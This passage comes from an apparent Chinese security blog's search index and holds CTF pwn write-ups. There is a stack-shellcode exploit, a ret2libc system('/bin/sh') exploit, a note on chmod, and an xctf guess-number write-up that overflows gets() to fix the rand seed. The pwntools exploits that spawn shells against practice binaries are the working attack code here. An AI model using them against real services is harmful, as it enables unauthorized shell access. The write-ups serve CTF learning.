string">'little'</span><span class="token punctuation">,</span> word_size<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">)</span>shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> shellcode <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">140</span><span class="token operator">-</span>len<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xffffcff0</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(sh)  ——这里启用的话可以进行调试。</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://s1.ax1x.com/2020/05/23/YvkgbD.png" alt=""><br>成功！！</p><h2 id="level2：NX开启，栈不可执行！"><a href="#level2：NX开启，栈不可执行！" class="headerlink" title="level2：NX开启，栈不可执行！"></a>level2：NX开启，栈不可执行！</h2><p>程序还是一样的就是在编译的时候开其NX保护机制。<br>那么像上面的方法将shellcode填入栈中，再用ret跳转到栈上执行shellcode的方法就不行了。</p><p>小知识：ps指令查看进程（注意pid）<br><img src="https://s1.ax1x.com/2020/05/23/YvkD81.png" alt=""><br>如果你通过sudo cat /proc/[pid]/maps查看，你会发现level1的stack是rwx的，但是level2的stack却是rw的。<br><img src="https://s1.ax1x.com/2020/05/23/YvkcDO.png" alt=""></p><h3 id="接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）："><a href="#接下来由于各种基层问题我引用蒸米的原文-其实是我是辣鸡）：" class="headerlink" title="接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）："></a>接下来由于各种基层问题我引用蒸米的原文(其实是我是辣鸡）：</h3><h4 id="我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。"><a href="#我们知道level2调用了libc-so，并且libc-so里保存了大量可利用的函数，我们如果可以让程序执行system-“-bin-sh”-的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system-这个函数的地址以及”-bin-sh”这个字符串的地址。如果关掉了ASLR的话，system-函数在内存中的地址是不会变化的，并且libc-so中也包含”-bin-sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”-bin-sh”字符串的地址。" class="headerlink" title="我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。"></a>我们知道level2调用了libc.so，并且libc.so里保存了大量可利用的函数，我们如果可以让程序执行system(“/bin/sh”)的话，也可以获取到shell。既然思路有了，那么接下来的问题就是如何得到system()这个函数的地址以及”/bin/sh”这个字符串的地址。如果关掉了ASLR的话，system()函数在内存中的地址是不会变化的，并且libc.so中也包含”/bin/sh”这个字符串，并且这个字符串的地址也是固定的。那么接下来我们就来找一下这个函数的地址。这时候我们可以使用gdb进行调试。然后通过print和find命令来查找system和”/bin/sh”字符串的地址。</h4><p>步骤：<br>首先再main函数上下一个断点，然后执行程序，这样的话程序会加载libc.so到内存中。<br>通过print system这个命令来获取system函数在内存中的位置。<br>通过print __libc_start_main这个命令获取libc.so在内存中的起始位置。<br>通过find命令查找/bin/sh这个字符串。</p><p><img src="https://s1.ax1x.com/2020/05/23/YvkBCR.png" alt=""><br>图中字符串/bin/sh有两个一个实在libc中的另一个是出题者给的hint（这个在ida中的字符串也可以找到）两个都可以用。<br>可以写exp了：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token comment" spellcheck="true">#xctfpwn6 == rop level2</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"level2"</span><span class="token punctuation">)</span>systemaddr <span class="token operator">=</span> <span class="token number">0xf7e19d10</span>binshaddr <span class="token operator">=</span> <span class="token number">0x804a024</span>ret <span class="token operator">=</span> <span class="token number">0x804a024</span>   <span class="token comment" spellcheck="true">#要注意的是system()后面跟的是执行完system函数后要返回地址，接下来才是”/bin/sh”字符串的地址。因为我们只需要执行system("/bin/sh")函数所以system的返回地址可任意。</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>systemaddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binshaddr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>连接到端口时脚本为：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>  <span class="token operator">//</span>虽然不是很明白，但加上这个是有点用处的，可以显示一些细节。elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>“level2"<span class="token punctuation">)</span> <span class="token operator">//</span> elf只是一个名字，level2是本地文件。sysaddr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">//</span> <span class="token punctuation">.</span>symbols是用来搜寻函数的，此处搜寻system的地址（在本地文件了level2中搜寻）!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>s1<span class="token punctuation">.</span>ax1x<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">23</span><span class="token operator">/</span>Yvkrgx<span class="token punctuation">.</span>png<span class="token punctuation">)</span>binshaddr <span class="token operator">=</span> elf<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token punctuation">.</span>search 找字符串，汇编代码或者某个数值的地址。!<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span>https<span class="token punctuation">:</span><span class="token operator">//</span>s1<span class="token punctuation">.</span>ax1x<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token number">2020</span><span class="token operator">/</span><span class="token number">05</span><span class="token operator">/</span><span class="token number">23</span><span class="token operator">/</span>Yvkw59<span class="token punctuation">.</span>png<span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token number">140</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>sysaddr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binshaddr<span class="token punctuation">)</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"******"</span><span class="token punctuation">,</span> port<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>这里由ida字符串查看可知：<br><img src="https://s1.ax1x.com/2020/05/23/YvktDU.png" alt=""></p><p>本地文件里包括system与/bin/sh，所以在使用相关搜索功能时可以查询到。</p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF执行权限</title>
      <link href="/2020/04/23/elf-zhi-xing-quan-xian/"/>
      <url>/2020/04/23/elf-zhi-xing-quan-xian/</url>
      
        <content type="html"><![CDATA[<p>使用chmod命令：<br>chmod用于管理文件或目录的权限，文件或目录权限的控制分别以读取(r)、写入(w)、执行(x)3种<br>可读可写可执行，抽象的用二进制来表示 1 代表拥有该权限，0 代表没有该权限，这样我们就可以看到<br>具有全部权限二进制可理解为  “111”  即 十进制的 “7”，只有读写权限二进制可理解为  “100”  即 十进制的 “4”</p><p>用法：chmod [选项] [文件..]</p><p>权限范围<br>u,User　　　   即文件或目录的拥有者<br>g,Group　　　即文件或目录的所属群组<br>o,Other　　　 除了文件或目录拥有者或所属群组之外，其他用户皆属于这个范围<br>a,All　　　　   即全部的用户，包含拥有者，所属群组以及其他用户<br>r　　　　　　 读取权限，数字代号为“4” 即 “100”<br>w　　　　　　写入权限，数字代号为“2” 即 “010”<br>x　　　　　　 执行或切换权限，数字代号为“1” 即 “001”<br>-　　　　　　 不具任何权限，数字代号为“0” 即 “000”</p><p>&lt;权限范围&gt;+&lt;权限&gt;　　       　　  增加指定权限 (chmod u+r file)<br>&lt;权限范围&gt;-&lt;权限&gt;　　  　　　　删除指定权限 (chmod g-rw file)<br>&lt;权限范围&gt;=&lt;权限&gt;　　　　　　 等于指定权限 (chmod o=rwx file)</p><p>例子：<br><img src="https://s1.ax1x.com/2020/05/23/YjqWND.png" alt=""></p><p>将suanfa文件增加可执行</p>]]></content>
      
      
      <categories>
          
          <category> MASS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xctf-gusnum</title>
      <link href="/2020/03/23/xctf-gusnum/"/>
      <url>/2020/03/23/xctf-gusnum/</url>
      
        <content type="html"><![CDATA[<p>1: file<br><img src="https://s1.ax1x.com/2020/05/23/YjOiQA.png" alt="64位"><br>2: checksec<br><img src="https://s1.ax1x.com/2020/05/23/YjOCzd.png" alt="保护全开"><br>3: 运行<br><img src="https://s1.ax1x.com/2020/05/23/YjLxIO.png" alt=""><br>4: ida伪代码<br><img src="https://s1.ax1x.com/2020/05/23/YjOpJe.png" alt=""><br>在用rand（）函数产生随机数时一般用srand（）初始化种子（seed）<br>rand函数调用<br>rand()函数每次调用前都会查询是否调用过srand(seed)，是否给seed设定了一个值，如果有那么它会自动调用srand(seed)一次来初始化它的起始值<br>若之前没有调用srand（seed），那么系统会自动给seed赋初始值，即srand（1）自动调用它一次</p><p>rand（）产生随机数时，如果用srand（seed）播下种子之后，一旦种子相同（下面的getpid方法），产生的随机数将是相同的。当然很多时候刻意让rand（）产生的随机数随机化，用时间作种子 srand（time（NULL）），这样每次运行程序的时间肯定是不相同的，产生的随机数肯定就不一样了。</p><p>从上面伪代码的解析可知：关键在于10次循环，每一次输入的值v4得等于随机数v6（1~6之间）就可以进入sub_C3E函数得到flag</p><p>gets函数：的v7：<br><img src="https://s1.ax1x.com/2020/05/23/YjLvdK.png" alt=""></p><p>可知v7大小0x30-0x10=0x20,下面就是seed这个sedd大小我没从stack中看出，在伪代码中定义的seed是unsigned int seed[2];<br> 大小为8个字节。<br>伪代码中srand用的是seed[0]所以如果能将seed[0]覆盖为以知就可以再写一个程序来得到rand的随机数（在linux中写）<br>得到随机数就能进入目标函数</p><p>尝试：<br>用0x20个字符填满v7后面加上0000，记住gets是将输入做当字符串，所以0000填满了seed[0]后因为seed是int型数据，里面的字符串以ASCII码存入会被直接解释为int数据即：0000的ASCII为0x30303030<br>所以seed的值为0x30303030，所以我们的代码seed值就是0x30303030：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span> </span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>               <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">0x30303030</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;=</span><span class="token number">9</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>   </code></pre><p>结果：</p><p><img src="https://s1.ax1x.com/2020/05/23/YjOSiD.png" alt=""></p><p>所以我们payload = “A”*0x20 + “0000”:<br><img src="https://s1.ax1x.com/2020/05/23/YjO9RH.png" alt=""></p><p>确实如此！！！！</p><p>写exp：</p><pre class=" language-python"><code class="language-python">rom pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"***"</span><span class="token punctuation">,</span><span class="token operator">**</span><span class="token operator">*</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token string">"0000"</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>num <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"5"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>本地测试：<br><img src="https://s1.ax1x.com/2020/05/23/YjOFsI.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xctf-pwn-easy </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
